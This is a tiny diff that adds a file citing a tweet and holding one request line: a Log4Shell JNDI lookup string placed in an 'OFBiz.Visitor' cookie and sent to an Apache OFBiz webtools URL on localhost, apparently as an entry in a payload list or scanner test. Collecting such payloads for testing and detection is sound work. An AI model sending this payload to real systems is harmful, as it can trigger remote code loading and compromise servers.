@@ -1,0 +1,3 @@
+# Source: https://twitter.com/sirifu4k1/status/1470011568834424837
+
+"Cookie: OFBiz.Visitor=\${jndi:ldap://localhost:1270/abc}" https://localhost:8443/webtools/control/main 
